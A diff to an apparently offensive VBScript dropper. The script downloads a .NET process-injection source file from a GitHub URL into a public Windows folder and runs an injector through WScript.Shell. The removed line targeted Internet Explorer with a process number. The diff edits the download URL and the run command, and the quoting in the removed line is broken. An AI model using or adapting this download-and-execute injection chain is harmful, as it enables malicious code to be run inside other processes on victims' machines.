@@ -7,7 +7,7 @@
 ' ===================================
 ' Download Clause
 ' Tested with binaries - works!
-HTTPDownload "https://raw.githubusercontent.com/dtrizna/.NET_inject/master/inject.cs", "C:\Users\Public\Downloads\"
+HTTPDownload "https://raw.githubusercontent.com/dtrizna/dotNETinject/master/inject.cs", "C:\Users\Public\Downloads\"
 
 Sub HTTPDownload( myURL, myPath )
 
@@ -62,7 +62,7 @@ Dim sh
 Dim mybin
 mybin = "C:\Program Files\Internet Explorer\iexplore.exe"
 Set sh = CreateObject("Wscript.Shell")  
-Call sh.Run("C:\Users\Public\Downloads\inject_252_114_x64.exe" & mybin" & 7804")  
+Call sh.Run("C:\Users\Public\Downloads\inject")  
 Set sh = Nothing  
 WScript.Quit()
     
